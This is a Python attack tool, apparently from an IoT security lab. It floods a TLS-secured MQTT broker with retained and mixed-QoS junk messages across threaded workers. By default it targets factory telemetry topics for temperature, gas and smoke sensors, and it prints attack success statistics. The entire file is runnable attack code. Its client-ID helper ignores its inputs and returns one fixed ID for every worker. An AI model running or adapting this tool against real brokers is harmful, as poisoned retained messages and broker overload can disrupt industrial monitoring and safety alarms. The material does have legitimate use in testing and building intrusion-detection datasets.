

import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
import sys
import os
import ssl
from datetime import datetime, timezone

def make_client_id(device_base: str, index: int,
                   prefix: str = "retain", suffix: str = "qos_replayer",
                   sep: str = "-") -> str:


    return f"{prefix}{sep}{suffix}"

class RetainQoSAbuseAttackTLS:
    def __init__(self, broker_host="localhost", broker_port=8884):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.attack_stats = {
            "retain_messages_sent": 0,
            "qos_messages_sent": 0,
            "messages_accepted": 0,
            "messages_rejected": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None
        }

    def create_client(self, client_id, username=None, password=None):

        try:
            client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)

            client.tls_set(ca_certs="certs/cacert.pem",
                          certfile="certs/clientcert.pem",
                          keyfile="certs/client-key.pem",
                          cert_reqs=ssl.CERT_REQUIRED,
                          tls_version=ssl.PROTOCOL_TLS,
                          ciphers=None)

            if username and password:
                client.username_pw_set(username, password)

            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def _derive_device_base_from_topic(self, topic: str) -> str:

        try:
            if not topic:
                return "sensor_unknown"
            piece = topic.split('/')[-2] if '/' in topic else topic

            piece = piece.replace("-", "_")
            piece = piece.lower()

            if piece.startswith("device"):
                piece = "sensor_" + piece
            return piece
        except Exception:
            return "sensor_unknown"

    def _get_client_id_for_worker(self, worker_id: int, topics: list, fallback_types=None):

        if fallback_types is None:
            fallback_types = ["sensor_cooler", "sensor_fanspeed", "sensor_motion"]

        if topics and len(topics) > 0:
            sample_topic = topics[worker_id % len(topics)]
            device_base = self._derive_device_base_from_topic(sample_topic)

            idx = (worker_id + 1)

            digits = ''.join(ch for ch in device_base if ch.isdigit())
            if digits:
                try:
                    idx = int(digits)
                except Exception:
                    idx = worker_id + 1
            return make_client_id(device_base, idx)
        else:
            device_base = fallback_types[worker_id % len(fallback_types)]
            return make_client_id(device_base, worker_id + 1)

    def retain_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100, username=None, password=None):

        client_id = self._get_client_id_for_worker(worker_id, topics)
        client = self.create_client(client_id, username, password)

        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        try:

            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()

            print(f" Worker {worker_id} ({client_id}): Connected (TLS), starting retain abuse...")

            for i in range(num_messages):
                try:
                    topic = random.choice(topics) if topics else f"test/retain/{worker_id}"

                    payload = {
                        "attack_type": "retain_abuse_tls",
                        "worker_id": worker_id,
                        "message_id": i,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "retain_data": "R" * random.randint(100, 1000)
                    }

                    result = client.publish(topic, json.dumps(payload), qos=0, retain=True)

                    self.attack_stats["retain_messages_sent"] += 1

                    if getattr(result, "rc", 1) == 0:
                        self.attack_stats["messages_accepted"] += 1
                        if i % 20 == 0:
                            print(f" Worker {worker_id} ({client_id}): Retain message {i} accepted (TLS)")
                    else:
                        self.attack_stats["messages_rejected"] += 1
                        print(f" Worker {worker_id} ({client_id}): Retain message {i} rejected")

                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)

                except Exception as e:
                    self.attack_stats["messages_rejected"] += 1
                    if i % 20 == 0:
                        print(f" Worker {worker_id} ({client_id}): Error sending retain message {i}: {e}")

            print(f" Worker {worker_id} ({client_id}): Completed retain abuse attack")

        except Exception as e:
            print(f" Worker {worker_id} ({client_id}): Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

    def qos_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100, username=None, password=None):

        client_id = self._get_client_id_for_worker(worker_id, topics)
        client = self.create_client(client_id, username, password)

        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        try:

            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()

            print(f" Worker {worker_id} ({client_id}): Connected (TLS), starting QoS abuse...")

            for i in range(num_messages):
                try:
                    topic = random.choice(topics) if topics else f"test/qos/{worker_id}"

                    qos_level = random.choice([0, 1, 2])

                    payload = {
                        "attack_type": "qos_abuse_tls",
                        "worker_id": worker_id,
                        "message_id": i,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "qos_level": qos_level,
                        "qos_data": "Q" * random.randint(100, 1000)
                    }

                    result = client.publish(topic, json.dumps(payload), qos=qos_level)

                    self.attack_stats["qos_messages_sent"] += 1

                    if getattr(result, "rc", 1) == 0:
                        self.attack_stats["messages_accepted"] += 1
                        if i % 20 == 0:
                            print(f" Worker {worker_id} ({client_id}): QoS {qos_level} message {i} accepted (TLS)")
                    else:
                        self.attack_stats["messages_rejected"] += 1
                        print(f" Worker {worker_id} ({client_id}): QoS {qos_level} message {i} rejected")

                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)

                except Exception as e:
                    self.attack_stats["messages_rejected"] += 1
                    if i % 20 == 0:
                        print(f" Worker {worker_id} ({client_id}): Error sending QoS message {i}: {e}")

            print(f" Worker {worker_id} ({client_id}): Completed QoS abuse attack")

        except Exception as e:
            print(f" Worker {worker_id} ({client_id}): Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

    def mixed_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100, username=None, password=None):

        client_id = self._get_client_id_for_worker(worker_id, topics)
        client = self.create_client(client_id, username, password)

        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        try:

            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()

            print(f" Worker {worker_id} ({client_id}): Connected (TLS), starting mixed abuse...")

            for i in range(num_messages):
                try:
                    topic = random.choice(topics) if topics else f"test/mixed/{worker_id}"

                    qos_level = 2
                    retain_flag = random.choice([True, False])

                    payload = {
                        "attack_type": "mixed_abuse_tls",
                        "worker_id": worker_id,
                        "message_id": i,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "mixed_data": "M" * random.randint(100, 1000)
                    }

                    result = client.publish(topic, json.dumps(payload), qos=qos_level, retain=retain_flag)

                    if retain_flag:
                        self.attack_stats["retain_messages_sent"] += 1
                    else:
                        self.attack_stats["qos_messages_sent"] += 1

                    if getattr(result, "rc", 1) == 0:
                        self.attack_stats["messages_accepted"] += 1
                        if i % 20 == 0:
                            print(f" Worker {worker_id} ({client_id}): Mixed message {i} (QoS:{qos_level}, Retain:{retain_flag}) accepted (TLS)")
                    else:
                        self.attack_stats["messages_rejected"] += 1
                        print(f" Worker {worker_id} ({client_id}): Mixed message {i} rejected")

                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)

                except Exception as e:
                    self.attack_stats["messages_rejected"] += 1
                    if i % 20 == 0:
                        print(f" Worker {worker_id} ({client_id}): Error sending mixed message {i}: {e}")

            print(f" Worker {worker_id} ({client_id}): Completed mixed abuse attack")

        except Exception as e:
            print(f" Worker {worker_id} ({client_id}): Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

    def launch_attack(self, attack_type="mixed", num_workers=2, messages_per_worker=100,
                     delay_ms=100, topics=None, username=None, password=None):

        if topics is None or len(topics) == 0:
            topics = [
                "factory/tenantA/Temperature/telemetry",
                "factory/tenantA/Humidity/telemetry",
                "factory/tenantA/Motion/telemetry",
                "factory/tenantA/CO-Gas/telemetry",
                "factory/tenantA/Smoke/telemetry",
                "system/test/retain",
                "security/test/qos"
            ]

        print(f" Starting Retain/QoS Abuse Attack (TLS)")
        print(f"   Attack type: {attack_type}")
        print(f"   Workers: {num_workers}")
        print(f"   Messages per worker: {messages_per_worker}")
        print(f"   Delay: {delay_ms}ms")
        print(f"   Topics: {len(topics)}")
        print(f"   Broker: {self.broker_host}:{self.broker_port}")
        print("=" * 60)

        self.attack_stats["start_time"] = time.time()

        threads = []

        if attack_type == "retain":
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.retain_abuse_worker,
                    args=(i, topics, messages_per_worker, delay_ms, username, password)
                )
                threads.append(thread)
        elif attack_type == "qos":
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.qos_abuse_worker,
                    args=(i, topics, messages_per_worker, delay_ms, username, password)
                )
                threads.append(thread)
        else:
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.mixed_abuse_worker,
                    args=(i, topics, messages_per_worker, delay_ms, username, password)
                )
                threads.append(thread)

        for thread in threads:
            thread.start()

        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):

        duration = (self.attack_stats["end_time"] - self.attack_stats["start_time"]) if self.attack_stats["end_time"] and self.attack_stats["start_time"] else 0
        total_messages = self.attack_stats["retain_messages_sent"] + self.attack_stats["qos_messages_sent"]

        print("\n Attack Statistics (TLS):")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Retain messages sent: {self.attack_stats['retain_messages_sent']}")
        print(f"QoS messages sent: {self.attack_stats['qos_messages_sent']}")
        print(f"Total messages: {total_messages}")
        print(f"Messages accepted: {self.attack_stats['messages_accepted']}")
        print(f"Messages rejected: {self.attack_stats['messages_rejected']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")

        if total_messages > 0:
            success_rate = (self.attack_stats['messages_accepted'] / total_messages * 100)
            print(f"Success rate: {success_rate:.1f}%")

        if duration > 0:
            print(f"Messages per second: {total_messages/duration:.1f}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Retain/QoS Abuse Attack (TLS)")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=8884, help="MQTT broker port")
    parser.add_argument("--type", choices=["retain", "qos", "mixed"], default="mixed",
                        help="Attack type: retain, qos, or mixed")
    parser.add_argument("--workers", type=int, default=2, help="Number of worker threads")
    parser.add_argument("--messages", type=int, default=100, help="Messages per worker")
    parser.add_argument("--delay", type=int, default=100, help="Delay between messages (ms)")
    parser.add_argument("--topics", nargs="+", help="Custom target topics")
    parser.add_argument("--username", help="MQTT username for authentication")
    parser.add_argument("--password", help="MQTT password for authentication")

    args = parser.parse_args()

    attack = RetainQoSAbuseAttackTLS(
        broker_host=args.broker,
        broker_port=args.port
    )

    attack.launch_attack(
        attack_type=args.type,
        num_workers=args.workers,
        messages_per_worker=args.messages,
        delay_ms=args.delay,
        topics=args.topics,
        username=args.username,
        password=args.password
    )

if __name__ == "__main__":
    main()
